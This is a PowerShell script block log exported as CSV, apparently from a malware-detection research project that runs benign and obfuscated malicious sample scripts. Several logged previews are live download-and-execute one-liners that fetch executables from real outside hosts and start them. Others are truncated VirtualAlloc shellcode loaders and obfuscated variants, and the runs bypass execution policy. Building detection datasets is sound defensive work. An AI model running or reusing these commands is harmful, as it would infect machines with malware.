"TimeCreated","ScriptPath","ScriptLength","ScriptPreview"
"8/5/2026 8:31:37 AM","","9","$global:?"
"8/5/2026 8:31:37 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:31:37 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:31:37 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:31:37 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:31:36 AM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\51.ps1'"
"8/5/2026 8:31:32 AM","","9","$global:?"
"8/5/2026 8:31:31 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:31:31 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:31:31 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:31:31 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:31:31 AM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\47.ps1'"
"8/5/2026 8:31:24 AM","","9","$global:?"
"8/5/2026 8:31:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:31:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:31:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:31:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:31:24 AM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\46.ps1'"
"8/5/2026 8:31:18 AM","","9","$global:?"
"8/5/2026 8:31:18 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:31:18 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:31:18 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:31:18 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:31:18 AM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\38.ps1'"
"8/5/2026 8:31:12 AM","","9","$global:?"
"8/5/2026 8:31:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:31:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:31:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:31:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:31:12 AM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\37.ps1'"
"8/5/2026 8:31:05 AM","","9","$global:?"
"8/5/2026 8:31:05 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:31:05 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:31:05 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:31:05 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:31:05 AM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\33.ps1'"
"8/5/2026 8:30:54 AM","","9","$global:?"
"8/5/2026 8:30:54 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:30:54 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:30:54 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:30:54 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:30:54 AM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\17.ps1'"
"8/5/2026 8:30:49 AM","","9","$global:?"
"8/5/2026 8:30:49 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:30:49 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:30:49 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:30:49 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:30:49 AM","C:\TA\project-ta\data_spliting\test_set\benign\12.ps1","569","$poshGitModule = Get-Module posh-git -ListAvailable | Sort-Object Version -Descending | Select-Object -First 1; if ($poshGitModule) {; $poshGitModule | Import-Module; }; elseif (Test-Path -LiteralPath"
"8/5/2026 8:30:49 AM","","147","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\12.ps1'"
"8/5/2026 8:30:44 AM","","9","$global:?"
"8/5/2026 8:30:44 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:30:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:30:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:30:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:30:44 AM","","146","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\6.ps1'"
"8/5/2026 8:30:36 AM","","9","$global:?"
"8/5/2026 8:30:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:30:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:30:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:30:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:30:36 AM","","146","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\benign\3.ps1'"
"8/5/2026 8:30:05 AM","","9","$global:?"
"8/5/2026 8:30:05 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:30:05 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:30:05 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:30:05 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:30:05 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\124.ps1","128","(NeW`-`Obj`ECt System.Net.WebClient).DownloadFile('https://1fichier.com/?v8w3g736hj','fleeb.exe');s`TART-pr`o`cesS 'fleeb.exe'
"
"8/5/2026 8:30:05 AM","","174","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\124.ps1'"
"8/5/2026 8:29:58 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\112.ps1","166","(New`-`ObJeCt System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");S`Tart-P`ROC`eSs (""$env:APPDATA\scvhost.exe"")
"
"8/5/2026 8:29:58 AM","","174","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\112.ps1'"
"8/5/2026 8:29:52 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:29:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:29:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:29:52 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:29:52 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\102.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:29:52 AM","","174","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\102.ps1'"
"8/5/2026 8:29:46 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:29:46 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:29:45 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:29:45 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:29:45 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\82.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:29:45 AM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\82.ps1'"
"8/5/2026 8:29:18 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:29:18 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:29:18 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:29:18 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:29:18 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\67.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:29:18 AM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\67.ps1'"
"8/5/2026 8:29:08 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:29:08 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:29:08 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:29:08 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:29:07 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\66.ps1","2236","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:29:07 AM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\66.ps1'"
"8/5/2026 8:29:02 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:29:02 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:29:02 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:29:02 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:29:02 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\61.ps1","2452","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:29:02 AM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\61.ps1'"
"8/5/2026 8:28:53 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:28:53 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:28:53 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:28:53 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:28:52 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\52.ps1","2717","$6UhT = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/5/2026 8:28:52 AM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\52.ps1'"
"8/5/2026 8:28:32 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:28:32 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:28:32 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:28:32 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:28:32 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\14.ps1","2251","$qkc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/5/2026 8:28:32 AM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\14.ps1'"
"8/5/2026 8:28:21 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:28:21 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:28:21 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:28:21 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:28:21 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\13.ps1","2252","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:28:21 AM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\13.ps1'"
"8/5/2026 8:28:06 AM","","9","$global:?"
"8/5/2026 8:28:06 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:28:06 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:28:06 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:28:06 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:28:06 AM","","120","(New-Object System.Net.WebClient).DownloadFile('https://1fichier.com/?v8w3g736hj','fleeb.exe');Start-Process 'fleeb.exe'"
"8/5/2026 8:28:05 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\124.ps1","444","Invoke-expReSSION(((""{11}{10}{7}{8}{9}{18}{3}{15}{35}{14}{31}{0}{36}{6}{17}{16}{20}{34}{28}{1}{21}{5}{19}{26}{25}{32}{13}{29}{23}{24}{33}{30}{27}{4}{22}{2}{12}"" -f 'oa','ich','b.exe','b','ss tZpf','om"
"8/5/2026 8:28:05 AM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\124.ps1'"
"8/5/2026 8:27:58 AM","","159","(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");Start-Process (""$env:APPDATA\scvhost.exe"")"
"8/5/2026 8:27:58 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\112.ps1","725"," (((""{50}{41}{40}{6}{24}{2}{16}{49}{20}{35}{52}{25}{36}{18}{17}{11}{8}{7}{37}{29}{42}{13}{45}{15}{47}{3}{48}{10}{31}{26}{9}{30}{39}{21}{46}{43}{4}{12}{33}{0}{34}{27}{19}{14}{32}{5}{28}{44}{1}{38}{51}{"
"8/5/2026 8:27:58 AM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\112.ps1'"
"8/5/2026 8:27:37 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:27:37 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:27:37 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:27:37 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:27:36 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:27:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\102.ps1","2963"," ((""{9}{57}{26}{15}{16}{38}{35}{69}{28}{47}{45}{0}{61}{49}{18}{24}{68}{12}{53}{5}{58}{11}{21}{31}{33}{14}{10}{7}{48}{27}{62}{37}{56}{50}{19}{64}{1}{29}{63}{59}{13}{65}{22}{51}{44}{4}{25}{39}{3}{36}{52"
"8/5/2026 8:27:36 AM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\102.ps1'"
"8/5/2026 8:27:29 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:27:29 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:27:29 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:27:29 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:27:28 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:27:28 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\82.ps1","2763",".( $ShELLID[1]+$SheLLiD[13]+'X')( (((""{5}{0}{24}{20}{38}{40}{10}{6}{43}{13}{45}{1}{18}{4}{15}{44}{2}{42}{9}{14}{31}{46}{7}{26}{35}{41}{32}{30}{12}{3}{11}{8}{19}{36}{39}{23}{27}{34}{29}{21}{25}{37}{22}"
"8/5/2026 8:27:28 AM","","172","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\82.ps1'"
"8/5/2026 8:27:16 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:27:16 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:27:16 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:27:16 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:27:16 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:27:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\67.ps1","2780",".( $Env:cOMspec[4,26,25]-jOin'') ( (((""{35}{37}{42}{40}{6}{21}{41}{10}{28}{27}{26}{33}{1}{45}{25}{36}{38}{22}{18}{29}{2}{46}{16}{44}{3}{13}{23}{17}{30}{5}{39}{15}{34}{9}{14}{0}{12}{8}{24}{11}{7}{32}{3"
"8/5/2026 8:27:16 AM","","172","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\67.ps1'"
"8/5/2026 8:26:30 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:26:30 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:26:30 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:26:30 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:26:30 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:26:29 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\66.ps1","2965"," ((""{48}{21}{24}{33}{0}{34}{40}{32}{3}{6}{58}{66}{61}{27}{16}{14}{54}{29}{10}{64}{12}{50}{65}{60}{37}{17}{42}{43}{59}{35}{38}{5}{20}{23}{68}{18}{31}{15}{30}{47}{4}{67}{44}{56}{19}{46}{45}{55}{7}{53}{1"
"8/5/2026 8:26:29 AM","","172","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\66.ps1'"
"8/5/2026 8:26:22 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:26:22 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:26:22 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:26:22 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:26:22 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:26:22 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\61.ps1","3015","(((""{32}{13}{45}{16}{17}{38}{20}{4}{7}{6}{27}{39}{50}{19}{40}{10}{26}{0}{11}{15}{12}{48}{18}{14}{46}{43}{44}{8}{24}{49}{34}{25}{41}{5}{21}{31}{33}{23}{28}{2}{9}{1}{36}{22}{47}{3}{29}{37}{30}{35}{42}""-"
"8/5/2026 8:26:21 AM","","172","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\61.ps1'"
"8/5/2026 8:26:14 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:26:14 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:26:13 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:26:13 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:26:13 AM","","2711","$6UhT = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/5/2026 8:26:13 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\52.ps1","3550"," (((""{8}{57}{55}{41}{15}{72}{45}{3}{33}{17}{52}{81}{77}{47}{32}{38}{50}{44}{5}{9}{35}{70}{2}{26}{62}{60}{22}{14}{28}{29}{27}{65}{58}{4}{20}{30}{21}{82}{68}{64}{69}{13}{40}{36}{10}{11}{0}{80}{46}{24}{5"
"8/5/2026 8:26:13 AM","","172","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\52.ps1'"
"8/5/2026 8:26:07 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:26:07 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:26:07 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:26:07 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:26:07 AM","","2244","$qkc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/5/2026 8:26:07 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\14.ps1","2802","((""{39}{6}{37}{19}{22}{34}{27}{32}{35}{7}{25}{31}{36}{44}{40}{17}{30}{4}{14}{9}{28}{33}{21}{11}{20}{1}{23}{38}{16}{5}{29}{15}{3}{45}{46}{41}{10}{24}{43}{42}{2}{26}{18}{13}{0}{8}{12}"" -f 'eThrea','0x33"
"8/5/2026 8:26:07 AM","","172","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\14.ps1'"
"8/5/2026 8:25:47 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:25:47 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:25:47 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:25:47 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:25:46 AM","","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:25:46 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\13.ps1","2788"," ((""{45}{27}{34}{8}{25}{10}{1}{41}{30}{21}{35}{5}{40}{15}{20}{28}{22}{38}{13}{6}{18}{14}{24}{37}{26}{46}{36}{16}{29}{7}{42}{0}{31}{33}{23}{9}{44}{11}{32}{2}{12}{17}{43}{19}{39}{4}{3}""-f 'f,0xd5,0x97,0"
"8/5/2026 8:25:46 AM","","172","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\13.ps1'"
"8/5/2026 8:25:10 AM","","9","$global:?"
"8/5/2026 8:25:10 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:25:10 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:25:10 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
